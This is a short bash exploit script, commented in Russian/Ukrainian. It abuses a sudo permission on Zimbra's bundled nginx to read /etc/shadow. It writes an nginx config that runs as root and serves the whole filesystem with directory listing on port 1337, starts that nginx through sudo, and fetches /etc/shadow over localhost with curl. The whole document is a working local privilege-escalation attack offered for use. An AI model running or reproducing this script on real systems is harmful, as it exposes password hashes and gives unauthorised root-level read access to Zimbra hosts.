#!/bin/bash

# Скрипт для получения даних их /etc/shadow

echo "[+] making config"
cat <<EOF >/tmp/nginx.conf
user root;
worker_processes 4;
pid /tmp/nginx.pid;
events {
        worker_connections 768;
}
http {
server {
    listen 1337;
    root /;
    autoindex on;
}
}
EOF
echo "[+] Launching..."
sudo /opt/zimbra/common/sbin/nginx -c /tmp/nginx.conf
echo "[+] Reading /etc/shadow..."
curl http://localhost:1337/etc/shadow
